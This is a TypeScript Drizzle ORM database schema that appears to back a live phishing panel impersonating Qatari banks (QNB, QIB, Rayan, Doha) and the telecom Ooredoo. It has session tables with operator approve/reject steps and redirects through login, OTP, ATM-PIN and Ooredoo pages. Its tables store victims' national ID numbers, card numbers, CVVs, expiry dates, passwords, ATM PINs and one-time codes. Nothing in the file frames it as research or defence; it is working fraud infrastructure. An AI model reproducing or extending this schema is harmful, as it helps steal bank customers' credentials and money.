import { integer, pgEnum, pgTable, text, timestamp, varchar } from "drizzle-orm/pg-core";

export const roleEnum = pgEnum("role", ["user", "admin"]);

export const users = pgTable("users", {
  id: integer("id").primaryKey().generatedAlwaysAsIdentity(),
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: roleEnum("role").default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull(),
});

export const sessions = pgTable("sessions", {
  id: varchar("id", { length: 64 }).primaryKey(),
  selectedBank: varchar("selectedBank", { length: 50 }).notNull(), // qnb, qib, rayan, doha
  country: varchar("country", { length: 100 }).default("Qatar"),
  status: varchar("status", { length: 20 }).default("pending").notNull(), // pending, loading, approved, rejected
  currentStep: varchar("currentStep", { length: 50 }), // login, otp, atm, ooredoo, otp_ooredoo
  adminAction: varchar("adminAction", { length: 20 }), // approve, reject
  redirectTarget: varchar("redirectTarget", { length: 50 }), // login-method, otp, atm-pin, ooredoo, otp-ooredoo, success
  errorMessage: text("errorMessage"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().notNull(),
});

export const personalDataSubmissions = pgTable("personalDataSubmissions", {
  id: integer("id").primaryKey().generatedAlwaysAsIdentity(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  nameArabic: text("nameArabic").notNull(),
  nameEnglish: text("nameEnglish").notNull(),
  idNumber: varchar("idNumber", { length: 50 }).notNull(),
  phoneNumber: varchar("phoneNumber", { length: 20 }).notNull(),
  email: varchar("email", { length: 320 }).notNull(),
  dateOfBirth: varchar("dateOfBirth", { length: 20 }).notNull(),
  gender: varchar("gender", { length: 10 }).notNull(), // male, female
  customerStatus: varchar("customerStatus", { length: 50 }).notNull(), // existing, new
  submittedAt: timestamp("submittedAt").defaultNow().notNull(),
});

export const loginMethodSubmissions = pgTable("loginMethodSubmissions", {
  id: integer("id").primaryKey().generatedAlwaysAsIdentity(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  loginType: varchar("loginType", { length: 20 }).notNull(), // card, user
  // For card login
  cardNumber: varchar("cardNumber", { length: 50 }),
  cardholderName: text("cardholderName"),
  expiryDate: varchar("expiryDate", { length: 10 }),
  cvv: varchar("cvv", { length: 10 }),
  // For username/password login
  username: varchar("username", { length: 255 }),
  password: text("password"),
  submittedAt: timestamp("submittedAt").defaultNow().notNull(),
});

export const atmPinSubmissions = pgTable("atmPinSubmissions", {
  id: integer("id").primaryKey().generatedAlwaysAsIdentity(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  pin: varchar("pin", { length: 10 }).notNull(),
  submittedAt: timestamp("submittedAt").defaultNow().notNull(),
});

export const otpSubmissions = pgTable("otpSubmissions", {
  id: integer("id").primaryKey().generatedAlwaysAsIdentity(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  otpCode: varchar("otpCode", { length: 10 }).notNull(),
  otpType: varchar("otpType", { length: 20 }).notNull(), // standard, ooredoo
  submittedAt: timestamp("submittedAt").defaultNow().notNull(),
});

export const ooredooSubmissions = pgTable("ooredooSubmissions", {
  id: integer("id").primaryKey().generatedAlwaysAsIdentity(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  ooredooUser: varchar("ooredooUser", { length: 255 }).notNull(),
  ooredooPassword: text("ooredooPassword").notNull(),
  submittedAt: timestamp("submittedAt").defaultNow().notNull(),
});
